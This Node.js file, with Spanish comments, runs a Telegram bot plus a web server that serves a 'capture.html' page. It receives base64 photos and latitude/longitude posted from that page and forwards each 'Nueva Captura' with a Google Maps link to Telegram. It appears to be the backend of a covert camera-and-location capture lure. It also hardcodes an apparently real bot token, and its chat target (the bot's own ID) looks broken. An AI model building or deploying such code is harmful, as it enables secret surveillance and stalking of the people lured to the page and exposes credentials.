const { Telegraf } = require('telegraf');
const http = require('http');
const fs = require('fs');

// TU TOKEN DE TELEGRAM
const BOT_TOKEN = '9087778104:AAEwlyzptGIwaArDnCdQcP-2yKAUREw8Vws'; 
const bot = new Telegraf(BOT_TOKEN);

bot.start((ctx) => ctx.reply('¡Hola! Soy tu asistente.'));

// --- SERVIDOR WEB PARA RECIBIR DATOS DE LA CAPTURA ---
const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
    // Ruta principal: Sirve el archivo capture.html
    if (req.url === '/') {
        fs.readFile('capture.html', (err, data) => {
            if (err) {
                res.writeHead(500);
                return res.end('Error loading page');
            }
            res.writeHead(200);
            res.end(data);
        });
    } 
    // Ruta de envío: Recibe los datos del formulario (foto + ubicación)
    else if (req.url === '/send' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
            try {
                const params = new URLSearchParams(body);
                const imageUrl = params.get('image'); // Base64 de la imagen
                const lat = params.get('lat');
                const lng = params.get('lng');

                if (imageUrl && lat && lng) {
                    // Convertir base64 a buffer para enviar a Telegram
                    const imgBuffer = Buffer.from(imageUrl.replace(/^data:image\/jpeg;base64,/,""), 'base64');
                    
                    // Enviar foto al admin (o a un grupo/channel si prefieres)
                    await bot.telegram.sendPhoto(BOT_TOKEN.split(':')[0], imgBuffer, {
                        caption: `📍 Nueva Captura:\nLat: ${lat}\nLng: ${lng}\n\nVer ubicación: https://www.google.com/maps?q=${lat},${lng}`
                    });
                    
                    res.writeHead(200, {'Content-Type': 'text/plain'});
                    res.end('Datos recibidos correctamente');
                } else {
                    res.writeHead(400);
                    res.end('Faltan datos');
                }
            } catch (e) {
                console.error(e);
                res.writeHead(500);
                res.end('Error processing data');
            }
        });
    } 
    // Para cualquier otra ruta, servir el HTML
    else {
        fs.readFile('capture.html', (err, data) => {
            if (err) {
                res.writeHead(500);
                return res.end('Error');
            }
            res.writeHead(200);
            res.end(data);
        });
    }
});

server.listen(PORT, () => {
    console.log(`Servidor Web escuchando en el puerto ${PORT}`);
});

console.log("Bot de Telegram activo...");
